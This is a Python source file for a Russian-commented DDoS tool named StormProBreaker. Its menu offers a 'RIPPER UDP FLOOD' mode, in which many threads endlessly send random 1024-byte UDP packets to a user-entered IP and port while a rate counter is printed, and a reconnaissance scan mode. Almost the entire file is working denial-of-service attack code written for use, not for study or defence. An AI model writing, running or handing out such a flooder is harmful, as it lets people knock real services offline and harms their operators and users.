import socket
import random
import threading
import time
from modules.config import *
from modules.ui import banner
from modules.scanner import run_scan

class StormProBreaker:
    def __init__(self, profile='2'):
        self.stats = {'total': 0, 'success': 0}
        self.profile = PROFILES[profile]
        self.is_running = True

    def ripper_flood(self, host, port):
        # Логика а-ля DDOS-Ripper: бьем в порт напрямую
        payload = random._urandom(1024) # Генерируем случайный мусор
        while self.is_running:
            try:
                # Создаем сокет
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP быстрее для флуда
                if host and port:
                    s.sendto(payload, (host, port))
                    self.stats['total'] += 1
                    self.stats['success'] += 1
            except Exception:
                pass
            finally:
                s.close()

    def run(self):
        banner()
        print(f" {G}[1]{RE} RIPPER UDP FLOOD")
        print(f" {G}[2]{RE} SCANNER RECON")
        
        mode = input(f"\n{G}[?]{RE} Выберите режим > ")

        if mode == '2':
            target = input(f"\n{G}[?]{RE} IP для сканирования: ").strip()
            run_scan(target)
            input(f"\n{Y}[!] Нажмите Enter, чтобы выйти...{RE}")
            return

        target = input(f"\n{G}[?]{RE} IP Цели: ").strip()
        port = int(input(f" {G}[?]{RE} Порт (80): ") or 80)
        
        print(f"\n{G}[*]{RE} Запуск потоков...")
        threads = []
        for _ in range(self.profile['concurrent']):
            t = threading.Thread(target=self.ripper_flood, args=(target, port))
            t.daemon = True
            threads.append(t)
            t.start()

        start_time = time.time()
        try:
            while True:
                elapsed = time.time() - start_time
                rps = self.stats['total'] / max(1, elapsed)
                print(f"\r{B}|{RE} {BOLD}RIPPER RPS:{RE} {Y}{rps:.0f}{RE} ", end="")
                time.sleep(1)
        except KeyboardInterrupt:
            self.is_running = False
            print(f"\n{R}[!] Шторм утих.{RE}")

